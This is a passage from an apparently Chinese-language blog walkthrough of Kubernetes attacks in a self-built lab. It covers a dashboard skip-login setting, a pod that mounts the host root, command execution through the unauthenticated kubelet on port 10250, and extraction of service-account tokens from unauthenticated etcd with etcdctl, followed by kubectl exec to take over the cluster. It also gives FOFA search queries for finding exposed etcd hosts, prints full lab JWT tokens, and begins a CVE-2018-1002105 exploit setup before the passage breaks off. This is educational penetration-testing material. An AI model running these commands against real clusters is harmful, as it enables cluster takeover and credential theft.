namespace: kubernetes-dashboard</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"># Creating a ClusterRoleBinding</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: ClusterRoleBinding</span><br><span class="line">metadata:</span><br><span class="line">  name: admin-user</span><br><span class="line">roleRef:</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: ClusterRole</span><br><span class="line">  name: cluster-admin</span><br><span class="line">subjects:</span><br><span class="line">- kind: ServiceAccount</span><br><span class="line">  name: admin-user</span><br><span class="line">  namespace: kubernetes-dashboard</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#应用一下这个文件</span><br><span class="line">kubectl apply -f account.yaml </span><br><span class="line"># 获取token</span><br><span class="line">kubectl -n kubernetes-dashboard get secret $(kubectl -n kubernetes-dashboard get sa/admin-user -o jsonpath=&quot;&#123;.secrets[0].name&#125;&quot;) -o go-template=&quot;&#123;&#123;.data.token | base64decode&#125;&#125;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/k8s/image-20231229112518290.png" alt="image-20231229112518290"><br><img src="/images/k8s/image-20240102103656050.png" alt="image-20240102103656050"><br>即可登录进来。<br>这里为了方便，我们用./metarget拉一个thinkphp</p>
<p>./metarget appv install thinkphp-5-0-23-rce –external<br>这样便搭建完成。<br>这里可以看到，在我们登录的过程中，是没有登录密码的，登录上来需要token，而这个token的获取需要登录到服务器上，这样是很麻烦的。所以管理员可能会在创建面板的时候配置跳过这个面板登录，这就给我们了可乘之机。</p>
<h5 id="skip配置错误环境搭建"><a href="#skip配置错误环境搭建" class="headerlink" title="skip配置错误环境搭建"></a>skip配置错误环境搭建</h5><p>其实就是在刚刚的那个配置文件中加一条语句即可<br><code>- --enable-skip-login</code><br>加完后更新一下配置。</p>
<p><img src="/images/k8s/image-20240102105257323.png" alt="image-20240102105257323"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#改完配置后加载一下配置</span><br><span class="line">kubectl apply -f recommended.yaml</span><br><span class="line">#转发端口更新一下</span><br><span class="line">kubectl -n kubernetes-dashboard port-rward svc/kubernetes-dashboard --address 0.0.0.0 9090:443</span><br></pre></td></tr></table></figure>

<p><img src="/images/k8s/image-20240102105809949.png" alt="image-20240102105809949"></p>
<p>这个时候就会发现有个跳过按钮了，直接点即可。点右上角的加号，创建pod，这里创建的时候报错，<br><img src="/images/k8s/image-20240102110940163.png" alt="image-20240102110940163"></p>
<p><img src="/images/k8s/image-20240102111212074.png" alt="image-20240102111212074"></p>
<p><code>Deploying file has failedroles.rbac.authorization.k8s.io is forbidden: User  &quot;system:serviceaccount:kubernetes-dashboard:kubernetes-dashboard&quot; cannot create resource &quot;roles&quot; in API group &quot;rbac.authorization.k8s.io&quot; in the namespace &quot;default&quot;</code>没有权限，<br>根据这篇大师傅文章发现，还要有一个配置错误才可以<br>我们在配置文件中另起一行，添加如下内容</p>
<p><img src="/images/k8s/image-20240102135205095.png" alt="image-20240102135205095"></p>
<p>这里改完之后也不能控制面板，只能跳过登录上去，在渗透测试实战因为没有权限不似乎起不到什么作用。<br>我们还是使用token登录吧。登录上来之后就可以管理pods了</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">myapp</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx:1.14.2</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">container</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/mnt</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">test-volume</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test-volume</span></span><br><span class="line">    <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure>



<p><img src="/images/k8s/image-20240103104129876.png" alt="image-20240103104129876"></p>
<p>可以看到defaultnamespace的pods，此时只需要选中pods执行即可进入到shell中</p>
<p><img src="/images/k8s/image-20240103104423300.png" alt="image-20240103104423300"></p>
<p><img src="/images/k8s/image-20240103104502239.png" alt="image-20240103104502239"></p>
<h5 id="k8s10250端口未授权"><a href="#k8s10250端口未授权" class="headerlink" title="k8s10250端口未授权"></a>k8s10250端口未授权</h5><p>默认安装k8s的时候，会自动暴漏10250端口，在这个端口上运行者kubelet，kubelet的作用是在集群中每个节点运行，对容器进行生命周期的管理。运行在集群的每个节点上，负责向 API Server 注册所在的节点<br>正常情况下，默认访问10250端口会显示404<br>访问其他路由会显示<code>Unauthorized</code></p>
<p><img src="/images/k8s/image-20240103135639112.png" alt="image-20240103135639112"></p>
<p><img src="/images/k8s/image-20240103135702207.png" alt="image-20240103135702207"></p>
<p>如果管理员误将配置信息配置错误，那将会导致直接接管整个k8s集群。<br>但是如果将/var/lib/kubelet/config.yaml</p>
<p><img src="/images/k8s/image-20240103140439505.png" alt="image-20240103140439505"></p>
<p>中的anonymous改为true，那么也就会导致所有的用户访问（<code>啊这，感觉这个漏洞在实战中出现的机率不大，目前还没看出来，管理员改这个的动机是什么。</code>）</p>
<p>其他大师傅的文章写了将authorization.mode修改为AlwaysAllow，这里我没有更改也成功了，也有可能是版本问题把，不太清楚了。</p>
<p><img src="/images/k8s/image-20240103141133148.png" alt="image-20240103141133148"></p>
<p>改完配置后，要重启一下<code>systemctl restart kubelet</code><br>这个时候再用浏览器访问<a target="_blank" rel="noopener" href="https://ip:10250/runningpods/%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0%E6%89%80%E6%9C%89%E7%9A%84pods%E4%BA%86">https://ip:10250/runningpods/即可看到所有的pods了</a><br><img src="/images/k8s/image-20240103141430892.png" alt="image-20240103141430892"></p>
<p>访问这个端口不需要认证，那么就意味着，可以控制其中的pods了。<br><code>curl -XPOST -k &quot;https://$&#123;IP_ADDRESS&#125;:10250/run/&lt;namespace&gt;/&lt;pod&gt;/&lt;container&gt;&quot; -d &quot;cmd=&lt;command-to-run&gt;&quot;</code><br>这个curl命令执行进行，其中需要三个参数，这三个参数可以在/runningpods/中获取，也就是上图<br><img src="/images/k8s/image-20240103141848633.png" alt="image-20240103141848633"></p>
<p><code>curl -XPOST -k &quot;https://ip:10250/run/default/test-44441/test-44441&quot; -d &quot;cmd=id&quot;</code></p>
<p><img src="/images/k8s/image-20240103142250122.png" alt="image-20240103142250122"></p>
<p>也可以在浏览器中直接打</p>
<p><img src="/images/k8s/image-20240103161117043.png" alt="image-20240103161117043"></p>
<p>这样就直接可以命令执行了，<code>curl -XPOST -k &quot;https://ip:10250/run/default/test-44441/test-44441&quot; -d &quot;cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token&quot;</code>也可以使用这个命令获取该pods的token，但是，这里要注意，这个pods的token默认大概率不会是admin权限。当然这个token也是可以登录面板的。</p>
<p>一个 pod 与一个服务账户相关联，该服务账户的凭证（token）被放入该pod中每个容器的文件系统树，在 /var/run/secrets/kubernetes.io/serviceaccount/token</p>
<p>如果服务账号（Service account ）绑定了 cluster-admin （即集群的 admin 权限我们可以对所有namespace下实例进行操作） ，那么我们就可以通过 token 来进行一系列的操作</p>
<h6 id="意外的发现"><a href="#意外的发现" class="headerlink" title="意外的发现"></a>意外的发现</h6><p>在/runningpods/路由中，也查看到所有的运行的pods，那其实肯定还有其他的路由。<code>https://www.deepnetwork.com/blog/2020/01/13/kubelet-api.html</code>在这篇文章中列出了所有的api，其中我在logs路由中发现<br><img src="/images/k8s/image-20240103163719181.png" alt="image-20240103163719181"></p>
<p>存在目录遍历，仔细一看会发现，这好像是宿主主机上的/var/log、目录</p>
<p><img src="/images/k8s/image-20240103163810417.png" alt="image-20240103163810417"></p>
<p><img src="/images/k8s/image-20240103164555309.png" alt="image-20240103164555309"><br>那么也就是说，k8s在这里直接就映射了宿主主机的目录，并且是可以查看到</p>
<p><a target="_blank" rel="noopener" href="https://ip:10250/logs/apache2/![image-20240103164438478](/images/k8s/image-20240103164438478.png)">https://ip:10250/logs/apache2/![image-20240103164438478](/images/k8s/image-20240103164438478.png)</a></p>
<p>我还特意装了一个apache的，访问默认日志完全没有问题<br><img src="/images/k8s/image-20240103164711573.png" alt="image-20240103164711573"></p>
<h5 id="k8setcd未授权"><a href="#k8setcd未授权" class="headerlink" title="k8setcd未授权"></a>k8setcd未授权</h5><p>在安装完 K8s 后，默认会安装 etcd 组件，etcd 是一个高可用的 key-value 数据库，它为 k8s 集群提供底层数据存储，保存了整个集群的状态。大多数情形下，数据库中的内容没有加密，因此如果黑客拿下 etcd，就意味着能控制整个 K8s 集群。</p>
<p>在 K8s 集群初始化后，etcd 默认就以 pod 的形式存在，可以执行如下命令进行查看，etcd 组件监听的端口为 2379。</p>
<h6 id="为什么会出现etcd未授权"><a href="#为什么会出现etcd未授权" class="headerlink" title="为什么会出现etcd未授权"></a>为什么会出现etcd未授权</h6><p>在启动etcd时，如果没有指定 –client-cert-auth 参数打开证书校验，并且把listen-client-urls监听修改为0.0.0.0那么也就意味着这个端口被暴露在外，如果没有通过安全组防火墙的限制，就会造成危害</p>
<p>etcd默认端口2379</p>
<p>ps: 不过在安装k8s之后默认的配置2379都只会监听127.0.0.1，而不会监听0.0.0.0，那么也就意味着最多就是本地访问，不能公网访问。<br>这里经过研究发现，好像不同的搭建方式，在暴漏端口的时候是不同的，笔者在搭建的时候用的是metarget这个项目，搭建出来，直接就对公网开放，在参考其他大师傅搭建</p>
<p><img src="/images/k8s/image-20240104094328343.png" alt="image-20240104094328343"></p>
<p>这里可以看到默认访问2379端口是需要认证的。</p>
<p><img src="/images/k8s/image-20240104094105258.png" alt="image-20240104094105258"></p>
<h6 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h6><p>很简单，只需要将etcd的配置文件/etc/kubernetes/manifests/etcd.yaml改一下即<br>可，此时将–client-cert-auth写入到这个配置文件里面。</p>
<p><img src="/images/k8s/image-20240104102215246.png" alt="image-20240104102215246"></p>
<p>但这样我没有成功，<br><img src="/images/k8s/image-20240104143156795.png" alt="image-20240104143156795"></p>
<p>笔者将这里的默认true改为false，不用其他操作，等一会即可，</p>
<p>当访问<a target="_blank" rel="noopener" href="https://ip:2379/version%EF%BC%8C%E7%9A%84%E6%97%B6%E5%80%99%E5%87%BA%E7%8E%B0%E7%89%88%E6%9C%AC%E5%8F%B7%EF%BC%8C%E8%AF%B4%E6%98%8E%E5%AD%98%E5%9C%A8etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E3%80%82%E6%88%96%E8%80%85%60curl">https://ip:2379/version，的时候出现版本号，说明存在etcd未授权。或者`curl</a> <a target="_blank" rel="noopener" href="https://ip:2379/version">https://ip:2379/version</a> -k`</p>
<p><img src="/images/k8s/image-20240104145945782.png" alt="image-20240104145945782"></p>
<p><img src="/images/k8s/image-20240104143249101.png" alt="image-20240104143249101"></p>
<p>这个时候就可以使用etcdctl打了，<br>首先安装etcdctl，在kali中，直接<code>apt install etcd-client</code>即可<br><code>etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://ip:2379/ get  / --keys-only --prefix=true</code>测试一下</p>
<p><img src="/images/k8s/image-20240104150302852.png" alt="image-20240104150302852"></p>
<p><code>经过对几个大师傅的文章分析，这个etcd未授权漏洞，都是直接获取apiserver的token，然后去到6443端口接管整个集群</code><br>etcdctl –insecure-transport=false –insecure-skip-tls-verify –endpoints=<a target="_blank" rel="noopener" href="https://ip:2379/">https://ip:2379/</a> get  / –keys-only –prefix=true<br>执行这个命令会显示很多pods，images和其他信息，我们需要筛选一下重要的<br><code>etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://ip:2379/ get  --keys-only --prefix=true &quot;/&quot; | grep /secrets/kube-system/clusterrole</code></p>
<p><img src="/images/k8s/image-20240104154342453.png" alt="image-20240104154342453"></p>
<p>就可以看到这个pods了，<br>接下来直接<code>etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://ip:2379/ get  /registry/secrets/kube-system/clusterrole-aggregation-controller-token-c2vnw</code>把那个get后面的替换掉即可<br><img src="/images/k8s/image-20240104154543659.png" alt="image-20240104154543659"></p>
<p>token就在下面<br><img src="/images/k8s/image-20240104154641021.png" alt="image-20240104154641021"></p>
<p>kubectl –insecure-skip-tls-verify -s <a target="_blank" rel="noopener" href="https://ip:6443/">https://ip:6443</a> –token=”eyJhbGciOiJSUzI1NiIsImtpZCI6Ijc0dkliemNvaUFlcUdzeUV0VWxPYTBoTDdRZkNnbU5KYTRZUXRsVkRxVm8ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjbHVzdGVycm9sZS1hZ2dyZWdhdGlvbi1jb250cm9sbGVyLXRva2VuLW50cGcyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImNsdXN0ZXJyb2xlLWFnZ3JlZ2F0aW9uLWNvbnRyb2xsZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI5Y2I0MGU3OC05NDllLTRhZTUtYWQ2OC1mNWU4MjVjNjg1YTAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Y2x1c3RlcnJvbGUtYWdncmVnYXRpb24tY29udHJvbGxlciJ9.cJhYptSRTfI2SPTJBEMGvgmQQHTapQuUu7jJZbAlMzOiSJtaotjLZaQJo8DpoEbg0iTI_2CyC_vPqY0nj6dQyMdu5gV7nXJTJ-H5Po30-vP13bCSDesILPjP-gDMJfbrsB4RwYq_ngTnytm0MBC4k2ZBx2BH6mCXpQaGq_eU0ItmbZhKUmHSocp8AqaLsA_GAdtjhcl6whWvva1zQfWeHJ1tNrqrsmNVAXAeHQnBpJV72FFOtwi6oXryA0a4yV4QuMdYdhhEpS1fObN0_bTB7XasRB0CF9fWuKEgE4FPaUHeq2KV3CHf2Y9JhF3pI3SmQlBZ7G2kGLLB3UYViFa-Pw” -n kube-system get pods</p>
<p>eyJhbGciOiJSUzI1NiIsImtpZCI6Ijc0dkliemNvaUFlcUdzeUV0VWxPYTBoTDdRZkNnbU5KYTRZUXRsVkRxVm8ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjbHVzdGVycm9sZS1hZ2dyZWdhdGlvbi1jb250cm9sbGVyLXRva2VuLW50cGcyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImNsdXN0ZXJyb2xlLWFnZ3JlZ2F0aW9uLWNvbnRyb2xsZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI5Y2I0MGU3OC05NDllLTRhZTUtYWQ2OC1mNWU4MjVjNjg1YTAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Y2x1c3RlcnJvbGUtYWdncmVnYXRpb24tY29udHJvbGxlciJ9.cJhYptSRTfI2SPTJBEMGvgmQQHTapQuUu7jJZbAlMzOiSJtaotjLZaQJo8DpoEbg0iTI_2CyC_vPqY0nj6dQyMdu5gV7nXJTJ-H5Po30-vP13bCSDesILPjP-gDMJfbrsB4RwYq_ngTnytm0MBC4k2ZBx2BH6mCXpQaGq_eU0ItmbZhKUmHSocp8AqaLsA_GAdtjhcl6whWvva1zQfWeHJ1tNrqrsmNVAXAeHQnBpJV72FFOtwi6oXryA0a4yV4QuMdYdhhEpS1fObN0_bTB7XasRB0CF9fWuKEgE4FPaUHeq2KV3CHf2Y9JhF3pI3SmQlBZ7G2kGLLB3UYViFa-Pw</p>
<p>这里经过测试，发现clusterrole-aggregation-controller-token-c2vnw的权限是很小的，如果远程打，是获取不到pods的，403。</p>
<p><img src="/images/k8s/image-20240104162713928.png" alt="image-20240104162713928"></p>
<p>当然，如果机器安装了dashboard，也可以获取面板的token<br><img src="/images/k8s/image-20240104163233783.png" alt="image-20240104163233783"></p>
<p><img src="/images/k8s/image-20240104163304042.png" alt="image-20240104163304042"></p>
<p>面板的token也是不可以的。</p>
<p><img src="/images/k8s/image-20240104163501532.png" alt="image-20240104163501532"></p>
<p><code>经过分析其他大师傅的文章，这里不放放个其他大师傅的图了，仔细查看会发现他们打的时候，都是打的本机，也就是127.0.0.1,或者本机的内网地址,这是能够打通的.emmmmm，如果是内网，这样的话就不用那么麻烦了，如下图</code></p>
<p><img src="/images/k8s/image-20240104164034626.png" alt="image-20240104164034626"></p>
<p>这里的话，还可以看看其他pods，这里经过测验，直接匹配admin即可</p>
<p><img src="/images/k8s/image-20240104165552558.png" alt="image-20240104165552558"></p>
<p>找这种带secert的，大概率就是有权限的，再去请求，就可以</p>
<p><img src="/images/k8s/image-20240104165844883.png" alt="image-20240104165844883"></p>
<p><img src="/images/k8s/image-20240104165820101.png" alt="image-20240104165820101"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取某个pods信息</span></span><br><span class="line">etcdctl --insecure-transport=<span class="literal">false</span> --insecure-skip-tls-verify --endpoints=https://ip:2379/ get  --keys-only --prefix=<span class="literal">true</span> <span class="string">&quot;/&quot;</span> | grep dashboard</span><br><span class="line"><span class="comment">#获取某个podsadmin信息</span></span><br><span class="line">etcdctl --insecure-transport=<span class="literal">false</span> --insecure-skip-tls-verify --endpoints=https://ip:2379/ get  --keys-only --prefix=<span class="literal">true</span> <span class="string">&quot;/&quot;</span> | grep admin</span><br><span class="line"><span class="comment">#获取token</span></span><br><span class="line">etcdctl --insecure-transport=<span class="literal">false</span> --insecure-skip-tls-verify --endpoints=https://ip:2379/ get  /registry/secrets/kubernetes-dashboard/admin-user-token-h9sqp</span><br><span class="line"><span class="comment">#接管集群</span></span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://ip:6443/ --token=<span class="string">&quot;eyJhbGciOiJSUzI1NiIsImtpZCI6Ijc0dkliemNvaUFlcUdzeUV0VWxPYTBoTDdRZkNnbU5KYTRZUXRsVkRxVm8ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi11c2VyLXRva2VuLWg5c3FwIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFkbWluLXVzZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiJkODliYzBmNi01YzlmLTQ1YWItYTAyYi1hZGIyZjJhZGE5MjEiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZXJuZXRlcy1kYXNoYm9hcmQ6YWRtaW4tdXNlciJ9.YU547FavovN-pugK8Oe4tJ9bLpmv8VKIMBumqHEnqaB8Y4cJkQrvkYcgPaRFMDFizK75i8wTSTMxU4U2lQ4Jhl_GY_5jQ-zYvt5z8IY3azGiiOOD-Q38HpYZjPuzJWnopp6ROuSvJGT-ynPopl9xhKCcuZjAfuzYkx8wBu856-6wWUbnndF_GVtz9QrjUHysNHIDa2ECA4cCFVmZtjFlY9108lS6GIuIlhDs7089o-3odDL5tVEdd8yMilHW7Vrb5QxWpEUDRd99meKPohtv4LhzJdJTZ3SD9PRRZFGkIU-PGjyrwgub9uaI4R7vXlSwVqV_PpnfGZnPUSom4I4UDg&quot;</span> -n kube-system get pods</span><br><span class="line"></span><br><span class="line"><span class="comment">#某个pods执行命令</span></span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://ip:6443/ --token=<span class="string">&quot;eyJhbGciOiJSUzI1NiIsImtpZCI6Ijc0dkliemNvaUFlcUdzeUV0VWxPYTBoTDdRZkNnbU5KYTRZUXRsVkRxVm8ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi11c2VyLXRva2VuLWg5c3FwIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFkbWluLXVzZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiJkODliYzBmNi01YzlmLTQ1YWItYTAyYi1hZGIyZjJhZGE5MjEiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZXJuZXRlcy1kYXNoYm9hcmQ6YWRtaW4tdXNlciJ9.YU547FavovN-pugK8Oe4tJ9bLpmv8VKIMBumqHEnqaB8Y4cJkQrvkYcgPaRFMDFizK75i8wTSTMxU4U2lQ4Jhl_GY_5jQ-zYvt5z8IY3azGiiOOD-Q38HpYZjPuzJWnopp6ROuSvJGT-ynPopl9xhKCcuZjAfuzYkx8wBu856-6wWUbnndF_GVtz9QrjUHysNHIDa2ECA4cCFVmZtjFlY9108lS6GIuIlhDs7089o-3odDL5tVEdd8yMilHW7Vrb5QxWpEUDRd99meKPohtv4LhzJdJTZ3SD9PRRZFGkIU-PGjyrwgub9uaI4R7vXlSwVqV_PpnfGZnPUSom4I4UDg&quot;</span> <span class="built_in">exec</span> -n metarget -it thinkphp-5-0-23-rce-web-7bb696c45b-x5z9k  sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/k8s/image-20240104171320120.png" alt="image-20240104171320120"></p>
<h6 id="实战利用"><a href="#实战利用" class="headerlink" title="实战利用"></a>实战利用</h6><p>先记个fofa语法吧，就不实战利用了，没有授权，害怕。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fofa语法: Etcd &amp;&amp; port=&quot;2379&quot;</span><br><span class="line">fofa语法: Etcd &amp;&amp; port=&quot;2379&quot; &amp;&amp; country=&quot;CN&quot; //搜中国这边etcd协议并且是2379端口的ip/域名</span><br></pre></td></tr></table></figure>

<p>总的来说，etcd的未授权漏洞感觉在实战中碰到会很少，为什么这样说呢，因为这个漏洞存在是因为改了面板的一个配置，而这个配置，可能很少管理员会改，因为没有发现有啥动机能改这个配置。</p>
<h5 id="历史apiserver提权漏洞-CVE-2018-1002105"><a href="#历史apiserver提权漏洞-CVE-2018-1002105" class="headerlink" title="历史apiserver提权漏洞(CVE-2018-1002105)"></a>历史apiserver提权漏洞(<code>CVE-2018-1002105</code>)</h5><p>CVE-2018-1002105是一个K8s提权漏洞，Kubernetes用户可以在已建立的API Server连接上，打通了client到kubelet的通道，实现提升k8s普通用户到k8s api server的权限。</p>
<h6 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本:"></a>漏洞影响版本:</h6><ul>
<li>Kubernetes v1.0.x-1.9.x</li>
<li>Kubernetes v1.10.0-1.10.10 (fixed in v1.10.11)</li>
<li>Kubernetes v1.11.0-1.11.4 (fixed in v1.11.5)</li>
<li>Kubernetes v1.12.0-1.12.2 (fixed in v1.12.3)</li>
</ul>
<p><img src="/images/k8s/image-20240105101906393.png" alt="image-20240105101906393"></p>
<h6 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件:"></a>漏洞利用条件:</h6><p>参考<code>https://www.geekby.site/2021/11/k8s%E5%AE%89%E5%85%A8/#3-k8s-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E---cve-2018-1002105</code></p>
<p>k8s正常请求执行的链路是 <code>client --&gt; apiserver --&gt; kubelet</code></p>
<p>即 client 首先对 apiserver 发起请求，例如发送请求 [连接某一个容器并执行 exec] ，请求首先会被发到 apiserver，apiserver 收到请求后首先对该请求进行认证校验，如果此时使用的是匿名用户，api server 上是可以通过认证的，但会授权失败，即 client 只能走到 apiserver 而到不了 kubelet 就被返回 403 并断开连接了。</p>
<p>所以本次攻击的先决条件是，需要有一个可以从 client 到 apiserver 到 kubelet 整个链路通信认证通过的用户。且要知道token，也就是那个csv里的文件password。<br>有些文章写的是获取到一个主机的root权限，然后笔者就以为如果拿到一个shell是root权限即可，其实不是。准确的来说是有一个低权限的pod命令执行的权限，还有token密码。这个密码的作用是鉴权准备好的pods的，但是不饿能访问其他pods,来实现越权。</p>
<h6 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h6><p><a target="_blank" rel="noopener" href="https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/exploit.py">https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/exploit.py</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"># cve_2018_1002105_pod.yaml</span><br><span class="line"></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: test</span><br><span class="line">  namespace: test</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - name: ubuntu</span><br><span class="line">    image: nginx:1.14.2</span><br><span class="line">    imagePullPolicy: IfNotPresent</span><br><span class="line">    # Just spin &amp; wait forever</span><br><span class="line">    command: [ &quot;/bin/bash&quot;, &quot;-c&quot;, &quot;--&quot; ]</span><br><span class="line">    args: [ &quot;while true; do sleep 30; done;&quot; ]</span><br><span class="line">  serviceAccount: default</span><br><span class="line">  serviceAccountName: default</span><br><span class="line"> </span><br><span class="line"># cve_2018_1002105_namespace.yaml</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Namespace</span><br><span class="line">metadata:</span><br><span class="line">  name: test</span><br><span class="line"> </span><br><span 